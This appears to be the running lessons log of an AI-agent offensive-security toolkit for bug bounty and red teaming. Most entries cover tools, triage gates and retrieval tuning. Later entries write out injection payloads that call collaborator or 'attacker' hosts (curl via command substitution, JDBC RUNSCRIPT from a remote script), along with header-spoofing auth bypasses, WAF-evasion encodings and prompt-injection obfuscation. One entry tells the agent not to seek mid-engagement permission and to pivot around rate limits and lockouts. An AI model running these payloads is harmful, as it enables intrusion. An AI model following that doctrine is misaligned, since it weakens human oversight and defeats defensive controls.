- [2026-08-10T21:41:02Z] Always check .git/config + .env for HTTP 200 before deep recon — cheap, high-signal feeder
- [2026-08-10T21:43:14Z] 403/401 endpoint → always run the bypass-403 matrix (X-Forwarded-For:127.0.0.1, /%2e/, method swap, vendor WAF trick) before giving up — high-signal, disclosed-report battery
- [2026-08-10T21:43:14Z] Hidden params (arjun/x8) are gold and missed by scanners — run param-discover before deep IDOR/SSRF hunting
- [2026-08-10T21:43:14Z] Blind classes (SSRF/XXE/SQLi/RCE) need OOB (interactsh) correlation to confirm — no callback = not confirmed
- [2026-08-11T07:38:26Z] ruflo semantic memory is LIVE (namespace 'mad-hacks', 15 entries). At mission start, ALSO run mcp__ruflo__memory_search {query, namespace:'mad-hacks', smart:true} for fuzzy cross-engagement recall — then brain.sh recall for exact target history. After capture, re-run scripts/brain-sync-ruflo.sh + store new records.
- [2026-08-11T08:24:16Z] Full keyless arsenal complete (22 tools): recon nmap/naabu/dnsx/subfinder/amass/katana/waybackurls; web httpx/ffuf/gobuster/nikto/wafw00f/arjun/dalfox; scan nuclei/semgrep/osv-scanner; secrets gitleaks/trufflehog; tls openssl/testssl.sh; oob interactsh-client
- [2026-08-11T09:01:32Z] For CTF / AD / container / firmware / RE work, check references/ctf-techniques.md — load the specific technique checklist (evidence-focused: prove the whole validation/acceptance chain, not just decode).
- [2026-08-11T09:11:39Z] binary-audit is STATIC only — executing a target binary is active/receipt_required, do it in a lab. contract PoCs go in a Foundry fork, never mainnet.
- [2026-08-11T09:36:30Z] Deep per-technique workflows now in references/writeups-index.md (open-redirect, CRLF, host-header, blind-XSS/pastejacking, sqlmap-WAF-bypass, web-cache-deception, wordpress, s3-recon, punycode ATO, swagger XSS, github/CT recon, grafana path-traversal chain, react2shell RCE). Load the specific writeup on demand.
- [2026-08-11T09:37:23Z] Mega payload list wordlists/onelistforall.txt.gz (774k, gzipped) — decompress on demand: gunzip -c ... | ffuf -w -. Prefer curated per-class brain payloads first; the mega-list is last-resort fuzzing.
- [2026-08-11T10:54:22Z] Edge-case hunting reference (references/edge-case-hunting.md) — fuzz/property/mutation/resilience lenses for vuln discovery; boundaries are where vulns hide. Adapted from wio methodology.
- [2026-08-11T12:25:58Z] PRODUCTION/bug-bounty targets: references/production-safety.md is binding — throttle scans, safe-PoC only (alert(document.domain), id, one canary record, OOB callback), no availability impact, no bulk data, no persistence, clean up artifacts, stop at first proof unless chaining is authorized. Prove the exploit for the client with minimum blast radius.
- [2026-08-11T12:35:07Z] Burp MCP is NOT connected to the toolkit-authoring session; it must be added to the operator's own Claude Code session (claude mcp add / .mcp.json) then it auto-appears to ToolSearch('burp'). Agents prefer it when present, fall back to system tools when absent.
- [2026-08-11T19:25:54Z] Burp MCP gotcha (SOLVED): the Burp-bundled java (/Applications/Burp Suite.app/.../jre.bundle/.../bin/java) exits 137/SIGKILL when run standalone (macOS hardened-runtime) → 'Failed to connect'. FIX: register the proxy with Homebrew OpenJDK instead: claude mcp add burp -- /opt/homebrew/opt/openjdk/bin/java -jar ~/.BurpSuite/mcp-proxy/mcp-proxy-all.jar --sse-url http://127.0.0.1:9876. Burp SSE endpoint is root '/' (200, text/event-stream), NOT /sse (404). Requires Burp running + MCP Server BApp enabled on 9876.
- [2026-08-14T05:48:04Z] Burp MCP send_http1/2_request hangs (30s MCP-proxy timeout) on this setup while curl reaches target in ~1s — likely a dead upstream proxy in Burp's connection settings. Collaborator/scanner tools still usable; fall back to curl for sending until Burp's upstream proxy is fixed.
- [2026-08-14T06:48:06Z] Webhook APIs are prime SSRF targets — always test url field with OOB callback. Also test BOLA on org/tenant ID fields — multi-tenant APIs often trust the org_id from the request body instead of extracting it from the JWT.
- [2026-08-14T06:48:06Z] Batch vs singular endpoint inconsistency is a common pattern: one may validate while the other doesn't. Always test both when they exist.
- [2026-08-20T02:37:10Z] AWS API Gateway Lambda authorizers that validate JWT HS256 signatures are resistant to alg:none, signature tampering, and empty/missing tokens. Attack surface is in what the AUTHORIZER DOESN'T CHECK — org_id ownership, claim-based access control.
- [2026-08-20T02:37:10Z] Go net/http rejects CRLF in HTTP headers during request construction. CRLF injection in stored configs (webhook headers) becomes a DoS vector rather than header injection — the outbound request fails silently.
- [2026-08-20T02:37:10Z] Batch vs singular API endpoints often have DIFFERENT required field sets. Test both separately — the batch endpoint may leak additional field names via error messages.
- [2026-08-21T08:03:10Z] ENGAGEMENT MODE: confirm before Phase 0. Bug bounty = impact-demonstrated ONLY, hygiene rejected (EoL, permissive CSP, stack traces alone). Red team = hygiene + recon + IoCs + defensive-state ALL deliverable. Pentest = per-SoW. Internal audit = compliance-mapped. Wrong mode wastes the engagement — one authorized engagement produced 5 hygiene findings shipped as red-team on a bug-bounty scope; all N/A'd. Corrected pass yielded 11 impact-demonstrated bugs incl. 3 Critical. Write engagement type as line 1 of hunt notes; ask if unclear. (Source: claude-bughunter bb-methodology)
- [2026-08-21T08:03:10Z] 5-PHASE HUNT: (0) Confirm engagement mode, (1) Recon & Map — every host/endpoint/param, (2) Vuln Discovery — target 1-2 classes/session with a CIA/ATO/RCE goal, (3) Exploit & Chain — prove attacker-attainable harm, (4) Report — CVSS + 7-Question Gate. Non-linear: any phase can trigger back to Recon (new endpoint) or Discovery (new class idea). Daily discipline: Define ('target [feature] for [CIA impact]') → Select (1-2 vuln classes) → Execute (no wandering). (Source: claude-bughunter bb-methodology)
- [2026-08-21T08:03:10Z] 7-QUESTION GATE (kill finding on ANY 'no'): Q1 Can attacker use RIGHT NOW step-by-step? (write real HTTP req). Q2 Is impact on program's accepted list? Q3 Real-world consequence (ATO/PII read/money stolen)? Q4 Cost to attacker (time/capital)? Q5 Reproducible from a fresh account/context? Q6 Attacker-attainable — not requires-admin-first? Q7 Would a triager pay for this? Kill = individual finding only, engagement continues. Saves N/A ratio. (Source: claude-bughunter triage-validation)
- [2026-08-21T08:03:10Z] RED-TEAM DO NOT STOP: authorization at engagement start covers the entire engagement — do not insert mid-loop permission gates. AskUserQuestion after user chose a path = stall, not a check. Do not retract findings on single failed repro. Do not call defenses 'working as intended' — probe further. On blocker (captcha/rate-limit/WAF/lockout), pivot don't stop. Prefer access-yielding bugs over IDOR/CSRF/XSS. If vuln on app A, sweep sister apps B/C/D. (Source: claude-bughunter redteam-mindset)
- [2026-08-21T08:03:10Z] iOS: TestFlight builds are frequently LESS hardened than App Store releases — debug logging left on, staging API hosts hardcoded. If both exist, prefer TestFlight for pentest. Enterprise/ad-hoc IPAs are NOT FairPlay-encrypted — no jailbreak or decryption tooling needed (unlike App Store binaries pulled from a device). App Store binary requires runtime decrypt (frida-ios-dump/bagbak/flexdecrypt) on jailbroken device before static tools read it meaningfully. (Source: claude-bughunter ios-redteam-pipeline)
- [2026-08-21T08:03:10Z] iOS/Android SHADOW-API: iOS build often ships a DIFFERENT backend version than Android — diff the two for endpoints/parameters that exist on one platform only. Multi-brand orgs reuse com.<corp>.<sub-brand> naming across platforms — cross-reference sibling bundle IDs. App Store /search + /lookup APIs (no auth needed) enumerate publisher's full app catalogue via 'sellerName' pivot. (Source: claude-bughunter ios-redteam-pipeline + hunt-shadow-api)
- [2026-08-22T13:15:31Z] OOB-Or-It-Didn't-Happen Gate: For blind SSRF/XSS/XXE, server echoing URL in error message is NOT SSRF confirmation. Only DNS+HTTP Collaborator interactions count. Server returning different status codes for external vs localhost is NOT proof. From CBH hunt-ssrf (SharePoint engagement: 38 Collaborator payloads, 12+ params, zero OOB interactions despite URL-echo errors).
- [2026-08-22T13:15:31Z] Attribution before reporting: When testing multiple URL-accepting parameters, use ONE fresh Collaborator payload PER parameter with separate requests. Batch-testing with shared payload makes attribution impossible. Also run the negative control (params that produce no callback) — it goes in the report so client fixes the right field. From CBH hunt-ssrf.
- [2026-08-22T13:15:31Z] 7-Question Gate (CBH triage-validation): Before reporting any finding: Q1 can attacker use this right now step-by-step? Q2 is impact on program's accepted list? Q3 root cause in in-scope asset? Q4 requires privileged access attacker can't get? Q5 already known/accepted behavior? Q6 does fix exist that program would implement? Q7 can you write the report in 20 min? One wrong answer = kill the finding.
- [2026-08-22T13:15:31Z] XSS verification: Always use UNIQUE NUMERIC CANARY (e.g. alert(91234)) not alert(1). Practice pages contain example payloads with alert(1)/alert('XSS') in hint text. Unique number distinguishes YOUR reflected payload from page decoy examples. Also: %22onclick%3D in URL-encoded form attribute is NOT XSS — browser does NOT decode URL encoding inside HTML attribute values. From CBH hunt-xss (174 disclosed reports).
- [2026-08-22T13:15:42Z] CBH skill routing: 83 skills auto-trigger by topic. For hunt skills use /hunt target.com --vuln-class <class>. For recon use /recon. For validation use /validate or /triage. For chain building use /chain. For autonomous mode use /autopilot target --autonomous. For report generation use /report. Skills: hunt-ssrf, hunt-xss, hunt-idor, hunt-sqli, hunt-oauth, hunt-ssti, hunt-rce, hunt-jwt-crypto, hunt-graphql, hunt-race-condition, hunt-business-logic, hunt-llm-ai, hunt-http-smuggling, hunt-cache-poison, hunt-file-upload, hunt-deserialization, hunt-cors, hunt-csrf, etc.
- [2026-08-22T13:15:43Z] CBH disclosed report patterns: 681 reports across 24 vuln classes with exact payout ranges. Highest: hunt-xss (174 reports), hunt-misc (225), hunt-rce (67), hunt-brute-force (33), hunt-source-leak (31), hunt-lfi (31), hunt-open-redirect (28), hunt-idor (26), hunt-nodejs (24), hunt-deserialization (22). Report pattern docs at packs/claude-bughunter/disclosed-reports/.
- [2026-08-23T06:30:00Z] DEDUP GATE: Before confirming any finding, check against prior confirmed findings using references/dedup-methodology.md criteria. "Would fixing one also fix the other?" = duplicate. Different endpoints/params/root-causes = NOT duplicate even if same vuln class.
- [2026-08-23T06:30:00Z] STRIDE TAGGING: Every finding should be tagged with STRIDE leg(s) from references/stride-mapping.md. Enables coverage reporting (which threat-model legs are tested vs gaps) and executive-level risk aggregation.
- [2026-08-23T06:30:00Z] TECH-STACK ROUTING: When RECON identifies a specific technology (Firebase/Supabase/Auth0/Electron/Django/FastAPI/NestJS/LLM), load the matching section from references/tech-stack-playbooks.md for per-technology attack checklists. These stack-specific tests catch framework misconfigurations that generic vuln-class testing misses.
- [2026-08-23T06:30:00Z] SARIF OUTPUT: For any engagement with CI/CD integration needs, run `python3 scripts/sarif-export.py .t3mp3st/<target>` to generate GitHub code-scanning compatible SARIF. Include in the report deliverable alongside the markdown report.
- [2026-08-23T06:30:00Z] SCAN MODE SELECTION: Use references/scan-modes.md to calibrate depth. Quick=CI/PR (30min-2h, top-10 only). Standard=sprint review (2-8h, full surface). Deep=annual pentest (8h+, whitebox+chains+adversarial validation).
- [2026-08-23T06:30:00Z] Strix's SSRF skill has a comprehensive methodology including IMDSv2 bypass (intermediary services that can set headers/methods), DNS rebinding, URL parser differentials, and gopher/dict/file protocol abuse. Merge with CBH hunt-ssrf for maximum coverage. Key insight: "Blind SSRF → use interactsh (running in sandbox) for unique *.oast.fun domains, correlate hits to specific requests by restarting between payloads."
- [2026-08-23T07:00:00Z] CYBERSTRIKE CHAIN GRAPH: CyberStrike skills include chains_with + severity_boost fields — use to auto-suggest exploit chains. E.g. attack-ssrf chains_with attack-xxe ("SSRF via XXE parser = file read + internal network scanning") and attack-ssti ("SSRF from SSTI = full RCE chain"). When a finding matches a CyberStrike CWE, check chains_with for escalation paths. Skills at packs/cyberstrike/.
- [2026-08-23T07:00:00Z] POST-EXPLOITATION PLAYBOOKS: CyberStrike ships 7 post-exploit guides (AWS/Azure/GCP/K8s/Linux/macOS/Windows). When chain-builder confirms exploitation, load the matching post-exploit guide from packs/cyberstrike/<platform>-postexploit/ for pivoting methodology. Only relevant when engagement scope explicitly includes post-exploitation.
- [2026-08-23T07:00:00Z] OWASP WSTG 4.2 COVERAGE: CyberStrike WEB/ has 125 WSTG-aligned skills covering 11 categories (input validation, session, auth, client-side, business logic, API, crypto, error handling, config, info gathering, identity). Use as a COMPLETENESS CHECKLIST during Standard/Deep scans to verify no WSTG category was missed.
- [2026-08-23T07:00:00Z] LLM PENTEST DEPTH: AI-pentesting repo (packs/ai-pentesting/) provides OWASP LLM Top 10 v2025 educational depth — attack examples, mitigation strategies, 15+ curated lab links per vuln class. Complements hunt-llm-ai (H1 report patterns) and llm-security (CyberStrike automated scripts). Use for methodology backbone when llm-ai-hunter agent dispatches LLM testing.
- [2026-08-23T07:00:00Z] PROMPT INJECTION OBFUSCATION: LLM01 covers encoding bypass (Base64, ROT13, Unicode), emoji substitution, multi-turn crescendo attacks, and indirect injection via documents/web/email. When testing AI features, iterate through ALL obfuscation channels, not just direct text injection.
- [2026-08-23T07:00:00Z] PAYLOAD LIBRARY SCALE: brain/payloads/ now has 18,812 lines across 33 vuln classes. Key additions from PAT: sqli (1144, was 67), xss (1592, was 36), lfi (1468, new), cmdi (496, new), ssti (309, was 72), redirect (305, new), xxe (102, new). Always load per-class brain payloads BEFORE reaching for mega-lists. PAT full archive at packs/payloads-all-the-things/pat-full.tar.gz for on-demand extraction of less common classes.
- [2026-08-23T08:00:00Z] LAZY-LOAD DISCIPLINE (workflow precision): SKILL.md §0 is now 3 tiers, NOT a flat "read everything" list. TIER 1 always-resident = doctrine + pipeline ONLY. TIER 2 on-classify = references/router.md + one mission-families block + production-safety (if prod). TIER 3 = per-class/per-need, indexed in router.md, pulled on demand. Measured: up-front context 15.4k→3.9k tokens (75% cut). WHEN INGESTING A NEW REPO: add its assets to references/router.md's on-demand tables — do NOT add bullets to SKILL.md §0. Re-bloating §0 is the regression to guard against.
- [2026-08-23T08:00:00Z] OVERLAP PICK-ORDER (resolves same-class-in-4-repos): For any web vuln class, load in order and STOP when you can act: (1) brain/payloads/<class>.txt ALWAYS first, (2) dispatch <class>-hunter agent (covers ~90%), (3) ONE depth playbook only if stalled — CyberStrike attack-<class> for exploit CHAINS (chains_with/severity_boost), CBH hunt-<class> for BOUNTY $ patterns, Strix vulnerabilities/<class> for BYPASS when blocked, PAT for exotic payloads. Full map: references/router.md.
- [2026-08-23T09:30:00Z] ROUTER IS THE PRECISION SPINE: references/router.md is the single load-on-CLASSIFY map (family→assets + vuln-class→{payload,agent,depth}). It has 25 class rows incl. LFI, Auth-bypass/MFA/session (agent: auth-tester), IDOR/BOLA/privesc (agent: privilege-escalation). t3-scanner + t3-exploiter now route through it. Depth flags CS/Strix/CBH are audited to resolve to real files ONLY (Strix uses underscored names sql_injection/authentication_jwt/path_traversal_lfi_rfi; CBH disclosed-reports is a 24-class subset — no xxe/race/subdomain/info-disc there). When editing router rows, re-run the path-resolve check (test -f each asset) — an over-claim that names a missing file is worse than an omission.
- [2026-08-23T09:30:00Z] AUDIT DISCIPLINE: A multi-agent read-only audit (7 dimensions: dead-pointers, stale-counts, monolith, CBH-tree, agent-loading, router-coverage) found 40 findings across the toolkit — dead /tmp-clone paths (T3MP3ST, claude-bug-bounty both removed), stale counts (CyberStrike 156→157, CBH 58→24, PAT 72→64, STRIDE 60→55), a 126KB orphaned prompt monolith, and 2 uncovered payload/agent classes. Lesson: after any bulk ingest, sweep for (a) external paths that moved, (b) asset-count claims that drifted, (c) new payloads/agents with no router row. Cheap to verify with bash, high-signal for precision.
- [2026-08-23T18:00:00Z] WRITEUP-DRIVEN PRIORITIZATION: brain/writeups-corpus.md distills 6,421 disclosed writeups per class (prevalence + top-bounty exemplars). Use at CLASSIFY: top-dollar classes (RCE/ATO/SSRF/XXE/proto-pollution/cache-poison show $50k-288k) almost always CHAIN to ATO or full RCE — standalone rarely pays. Low-volume/low-solo classes (host-header/ssti/nosqli) are chain-feeders, not standalone reports. Before hunting class X, WebFetch a top exemplar from the corpus for technique depth. Canonical multi-class chain study: Curry "We Hacked Apple 3 Months" ($288.5k, chains XSS+RCE+SSRF+SQLi+XXE+IDOR+ATO).
- [2026-08-23T18:00:00Z] INGEST-THE-INTEL-NOT-THE-APP: When a repo is a server/app wrapping capability we already have (e.g. BountySkiller = Flask UI over claude-bug-bounty, which we're already derived from), extract the reusable INTEL (its source list, its queries) into a reference — do NOT adopt the app or run its scraper. BountySkiller's H1 hacktivity scraper uses a spoofed browser UA + deep-pages internal GraphQL to 10k rows = ToS-restricted automated access; we don't run it. Public archives (Pentester.land JSON) + RSS feeds are safe single-fetch. Source catalog: references/writeup-sources.md.
- [2026-08-23T19:00:00Z] BUG-BOUNTY SPINE = /mad-hunt (references/mad-hunt.md). For any web/API bounty target, this is the entry point — an exhaustion-contract loop on mad-hacks plumbing: scope.py deny-wins gate → preamble.py policy injection → per-host surface probe (recon.sh+web-scan.sh+surface-probe.sh = A-I) → surface×payout-ranked specialist hunters (≥25 attempts/class floor, ~50 for lit-up high-payout) → 7-Q gate + t3-verifier REFUTE → chain-builder escalation → platform-native ready-to-submit drafts. NEVER auto-submits, NEVER creates accounts (human-only — flag them). CBH /autopilot + /hunt are installed HOLLOW (rules/, brain.py, scope.yaml all missing) — do NOT try to run them; /mad-hunt replaces them using the SAME specialist hunter agents. Adaptive-throttle: a WAF/429 block is a PIVOT signal (run the bypass ladder), never a stop.
- [2026-09-01T17:00:25Z] dalfox v3 has NATIVE OAST/interactsh via --blind-oob AND an MCP stdio server (6 tools incl. preflight_dalfox for safe param discovery). For the XSS lane, prefer dalfox --blind-oob over our generic scripts/oob.sh. Register once: 'claude mcp add dalfox -- dalfox mcp'; then hunters auto-adapt via ToolSearch('dalfox').
- [2026-09-01T17:00:25Z] dalfox v3 output: use --format jsonl --stream-findings --include-all for evidence-grade line-per-finding streaming with full request/response attached. --dry-run does preflight-only (parameter discovery + impact estimate, NO attack traffic) — use it as the first probe on new bounty targets. Exit codes: 0=clean, 1=findings, 2=error — wire into dispatch.
- [2026-09-01T17:00:25Z] dalfox v3 is Rust (edition 2024), not Go. The 'dalfox pipe' subcommand from v2 workflows is now a hidden compat command; canonical v3 form is 'dalfox scan' for URL/file/pipe/raw-HTTP with auto-detection. All v2 pipeline recipes in references/recon-oneliners.md still work but should migrate.
- [2026-09-02T07:21:36Z] Deadangle discipline (from Rifteo): before delivering ANY finding/chain/severity, label each claim Verified (directly observed) / Inferred (logical from evidence but not triggered) / Assumed (framework default not tested). Assumed elements must be surfaced explicitly. Master Q: 'What would destroy this conclusion if I was wrong?' Strengthens our binary CONFIRMED/REFUTED to the ternary evidence actually supports. See references/deadangle.md.
- [2026-09-02T07:21:36Z] Rifteo Skills catalog (packs/rifteo-skills/, 38 skills, MIT) fills these gaps: ad-breach (Active Directory — full new lane), droid-recon (Android APK static analysis), clickjacking-hunter, hpp-hunter, jwt-cracker (dedicated), nuclei-template-writer, check-exploit (CVE exploitability), cvss-scorer, compliance-gap-analyzer + control-lookup + risk-assessor + remediation-planner (governance layer for pentest/audit). Load via 'cat packs/rifteo-skills/<skill>/SKILL.md' — do not re-write. Full catalog + when-to-use in references/rifteo-skills-catalog.md.
- [2026-09-02T07:21:36Z] Session handoff (from Rifteo): at end-of-day or context-getting-long, write .t3mp3st/<target>/HANDOFF.md — under 100 lines, findings-by-id (don't rewrite), coverage tested/skipped/partial, open threads, ordered next-steps specific enough to run without further context. Next session opens with 'cat HANDOFF.md' + 'brain.sh recall <target>'. Template + wiring in references/engagement-handoff.md.
- [2026-09-03T09:21:17Z] writeup-search MCP corpus: use scripts/build-writeup-corpus.sh to rebuild ~/.local/share/pentest-writeups/metadata.db from packs/writeups/. Server queries via WHERE content LIKE ? AND ... (AND-across-keywords). Bounty-filter pattern: 'content LIKE ? AND bounty != "-" AND bounty != ""' returns disclosed-bounty writeups. 6,577 rows total (23 CoffinXP full-body + 6,554 pentester.land metadata pointers with bug classes + bounty amounts).
- [2026-09-03T09:27:22Z] writeup-search MCP corpus refresh: run scripts/refresh-writeup-feeds.sh whenever fresh RSS entries matter (hourly cron is fine — Medium bug-bounty tag feeds update fastest). The mad-hacks MCP server checks metadata.db existence at __init__ ONLY — a fresh DB won't be picked up by a running server. To force reload: 'pkill -f mcp-writeup-server' — the Claude Code client's supervisor auto-respawns the process on the next tool call, and the fresh spawn hits the DB path check and loads sqlite mode. Alternative: '/mcp reconnect writeup-search' in an interactive terminal (does the same thing but user-driven).
- [2026-09-04T07:03:19Z] Asset registry is now the unifying discovery layer: brain.sh search <query> queries all 264 rows (references, scripts, tools, payloads, lessons, agents) by keyword. Fixes the 45-orphan tools/ gap architecturally — instead of writing prose lessons for each tool, we extract metadata (shebang, docstring, filename-inferred classes) programmatically. Canonical source of truth remains the file tree; registry is a regenerable index. Every hunter dispatch can call: bash scripts/brain.sh search '<target-keywords>' to discover relevant tools + writeups + agents in one query.
- [2026-09-04T07:12:22Z] Intelligence architecture (2026-09-04 refactor): canonical file-brain remains source of truth. Layers sitting on top: (1) brain/registry/assets.jsonl + assets.db — 265-row machine-readable registry with FTS5 lexical index; (2) optional brain/registry/assets.faiss — semantic index via MiniLM if faiss+sentence-transformers installed; (3) scripts/intelligence-recall.sh — unified RRF-fused router; (4) .engagement/<target>/ — first-class target state (TECHNOLOGY, OBSERVED, TESTED, EXHAUSTED structured records, HYPOTHESES, EVIDENCE.jsonl with epistemic ternary); (5) ruflo memory becomes an optional fast cache with provenance timestamps for staleness detection. Order of operations for a hunter dispatch: ToolSearch burp+dalfox → intelligence-recall.sh → engagement-state.sh recall → probe → evidence add + exhausted structured record → brain.sh learn.
- [2026-09-04T07:30:12Z] Intelligence retrieval baseline (2026-09-04, tests/intelligence/queries.jsonl, 64 queries): FTS5-only MRR=0.464 R@10=0.484; RRF (lex+writeups+target) MRR=0.468 R@10=0.531. Per-category (RRF): direct 0.588, tech-cross 0.750, synonym 0.378 R@10=0.700 (rescued from 0), ambiguous 0.357, indirect 0.100 (WEAKNESS — needs FAISS). State adversarial 9/9. E2E 12/12. Regression suite: bash tests/intelligence/run-all.sh — freeze this before router changes.
- [2026-09-04T13:35:00Z] Intelligence retrieval baseline v2 (router-as-filter refactor, audit correction #7): FTS5-only MRR=0.530 (+14% vs v1 0.464) R@10=0.562; RRF (lex+writeups+target) MRR=0.549 (+17% vs v1 0.468) R@10=0.625. Per-category (RRF): direct 0.676, synonym 0.578 (+53%), indirect 0.125 (+25%), ambiguous 0.357, tech-cross 0.750. State adversarial 27/27 (was 9/9). E2E 12/12. Improvements attributed to two changes shipping in the same commit: (a) fixed pre-existing rrf() dedup bug where `json.dumps(seen[key])` threw on set-typed _sources, latently dropping the "keep fullest record" path; (b) sem-row id synthesis so path-less sem rows survive dedup. Per-category MRR floors now hardcoded in test_retrieval.py — direct>=0.559, synonym>=0.359, indirect>=0.095, ambiguous>=0.339, tech-cross>=0.712 (each 5% below new baseline). Test invariant: state-absence (no --target ⇒ _state_adj={} + _final_score==_rrf_score + state.engaged=false). New router flag: --state-filter=on|off|auto (default auto — fires on --target). MADHACKS_EXHAUSTED_PENALTY env for tuning (default 0.4). Hypothesis-alignment + CONFIRMED-class boosts DEFERRED to separate commits per critique synthesis (needs per-category MRR delta each).
- [2026-09-04T14:20:00Z] Intelligence retrieval — hypothesis-boost mechanism (state-as-filter phase 2b): added to apply_state_filter() as a SECOND pass composing additively with exhausted-demote. Boost formula: for each row, signal = sum(HYP_CLASS_WEIGHT=1.0 for tokens in CLASS_KEYWORDS, HYP_GENERIC_WEIGHT=0.2 otherwise), capped at HYP_CAP=4.0. Boost = HYP_COEFF=0.15 × median(top-LIMIT _rrf_scores) × signal. Case-normalized on BOTH sides (correctness critic's must-fix from prior workflow — pseudocode had this backwards). A single class-vocabulary hit (e.g. 'ssrf' alone) crosses a meaningful signal threshold; generic tokens need to accumulate. Exhausted-demote applies BEFORE hypothesis-boost, so a row can be "exhausted BUT hypothesis-aligned" and take a smaller net demotion — chain-building hint. Baseline MRR unchanged (0.549 RRF, per-cat floors intact) because test_retrieval never passes --target, guarded by extended state-absence invariant. State adversarial 37/37 (was 27/27), +10 hypothesis-boost assertions. New env: MADHACKS_HYPOTHESIS_BOOST (default 0.15), MADHACKS_HYPOTHESIS_CAP (default 4.0). CONFIRMED-class boost still deferred to next commit.
- [2026-09-04T18:02:13Z] FILE UPLOAD RCE via metadata injection — extension bypass is only the first door. ExifTool/ImageMagick/IPTC parsers historically execute newline-embedded shell in metadata fields. Test payload: {"Title\n-if\nsystem('curl BURP_COLLAB')||1\n-Comment":"x"} in JSON body, or MVG/PGM 'image over ... |cmd' inside .svg. brain/payloads/file-upload.txt has the seed set. If direct ext bypass fails, always try metadata NEXT — same file, no ext change needed.
- [2026-09-04T18:02:13Z] ?url= PARAMS — test RCE BEFORE SSRF. Many url-loaders pipe the raw string to shell or a URL-parsing library that interpolates. Order of tests: (1) ?url=http://x";curl${IFS}BURP;# — semicolon+comment inside quoted host. (2) ?url=$(curl${IFS}BURP) — command substitution. (3) gopher:// dict:// file:// (SSRF fallback). If any RCE payload OOBs first, escalate BEFORE reporting the SSRF. brain/payloads/ssrf.txt seeded with variants.
- [2026-09-04T18:02:13Z] AI/ML load-model ENDPOINTS — client-side model/function loaders often accept arbitrary paths → (a) ../../ LFI trivially, (b) inline PHP function-injection (system('id'); phpinfo();) if the loader eval-imports, (c) blind RCE via burp-collab when neither reflects. Check every endpoint that says 'load model', 'load function', 'import config', 'load template' — this is a growing class as apps ship LLM/RAG features.
- [2026-09-04T18:02:13Z] H2 / embedded DB weaponization — JDBC INIT and TRACE parameters historically execute arbitrary SQL or Java on connection setup. Look for '/getSchema', '/actuator', '/env' + any Spring surface exposing DB config. Inject JDBC-URL suffixes: ;INIT=RUNSCRIPT FROM 'http://attacker/x.sql', ;TRACE_LEVEL_SYSTEM_OUT=3. Not-just-SQLi — the DB itself is the payload delivery. Common on internal admin panels + misconfigured microservices.
- [2026-09-04T18:02:13Z] API AUTH-BYPASS quickie fuzz — /api/public returning unauthorized? try (a) nested URL: ?anything=/api/private, (b) fake params: ?admin=true ?bypass=1 ?debug=1, (c) client-IP spoof headers: X-Custom-IP-Authorization: 127.0.0.1 + X-Forwarded-For: 127.0.0.1 + X-Real-IP: 127.0.0.1. Fastest paying-off bug class on APIs — always run this ladder before deep exploitation. brain/payloads/api-auth-bypass.txt has 46 variants.
- [2026-09-04T18:02:13Z] IMAGE-PARAM SSRF blocked? try XSS. When ?img=URL blocks host allowlist but still REFLECTS the URL raw (e.g. img tag src=... in the page), the parameter is often reachable via SVG payload: <svg/onload=eval(atob('...'))> or <svg><script>...</script></svg> served as image/svg+xml. Rule: SSRF and reflected-XSS are both consequences of 'server fetches or embeds user URL' — if one fails on filter, test the other on the same param.
- [2026-09-04T18:02:13Z] OSS-BACKED TARGETS — private-message and internal-endpoint leaks. If the target runs an open-source project (find via github README, /about, /license, wappalyzer), CLONE the upstream repo + grep 'app.route' / 'urlpatterns' / '/api/' / '@GetMapping' to enumerate EVERY endpoint. Compare against target's advertised API — leftover /api/internal, /api/messages, /getSchema, /admin/debug routes are the surface most bounty submitters miss. Combine with ffuf using the extracted route list as a wordlist.
- [2026-09-04T18:03:18Z] UNICODE-NORMALIZATION WAF BYPASS — many apps run NFKC/NFKD normalization AFTER their WAF+filter layer. The fullwidth Latin block (U+FF00-FF5E) folds to ASCII: ％ＥＦ％ＢＣ％９Ｃscript％ＥＦ％ＢＣ％９Ｅ becomes <script> in the DOM. Test order when <>"' are filtered: (1) %EF%BC%9C for '<' + %EF%BC%9E for '>' + %EF%BC%A2 for '"' + %EF%BC%87 for ''' + %EF%BD%80 for '`'. (2) inject a probe and grep the DOM for the canonical char. Automate with 0xacb/recollapse — it fuzzes ALL char-collapse variants (unicode, url, double-url, %00 quirks). brain/payloads/xss.txt has the seed set.
- [2026-09-04T18:03:42Z] WORDPRESS INFO-LEAK spine — /wp-json/wp/v2/users (unauthenticated user enum, often includes emails), /wp-json/wp/v2/settings (needs auth but often misconfigured), /wp-json/wp/v2/media (uploaded file paths → often internal), and plugin-specific: /wp-json/wordfence/v1/config (WAF config), /wp-json/elementor/v1/system-info (full server dump), /wp-json/wc/v3/orders (WooCommerce customer PII). Rotate ?status=any/private/all/edit on GET params — filters often skip these enum values. brain/payloads/api-endpoints.txt has the seed list. On any WP-fingerprinted target, fire this wordlist BEFORE anything else.
- [2026-09-04T18:04:46Z] SECRETS SCANNING — the mad-hacks secrets ladder: (1) run trufflehog OR gitleaks over target git history / cloned repo / downloaded JS bundle using packs/secrets-patterns-db/db/rules-stable.yml as the pattern set (1610 patterns, ReDoS-safe). (2) for exposed .env / .git / config leaks: grep -rP with high-confidence patterns only (AKIA[0-9A-Z]{16}, AIzaSy[a-zA-Z0-9_-]{33}, ghp_[a-zA-Z0-9]{36}, sk-[a-zA-Z0-9]{48}, xoxb-[0-9]{11}-[0-9]{11}-[0-9]{24}). (3) always verify a match is LIVE (aws sts get-caller-identity for AKIA, etc.) before reporting — a rotated/revoked key gets rejected as N/A.
- [2026-09-04T18:05:20Z] EXPLOITARIUM POC INDEX — bug-bounty-relevant POCs to check against target stack: (a) discourse-scoped-api-key-preauth-bypass — Discourse forums; (b) gitea-act-runner-container-options-poc + gogs-admin-csrf-git-hook-rce-poc — self-hosted git; (c) mybb-limited-acp-to-admin — MyBB forums; (d) nextcloud-federated-share-bearer-token-poc — Nextcloud; (e) nextjs-unstable-cache-object-argument-collision — Next.js apps; (f) nodebb-activitypub-attributedto-local-uid-spoof-poc — NodeBB; (g) flowise-mcp-env-case-bypass-poc — Flowise (LLM-app-builder); (h) discord-activity-stock-client-rce-poc — Discord Activity clients. When t3-recon fingerprints any of these, grep packs/exploitarium/ FIRST for a ready-made POC before writing one from scratch.
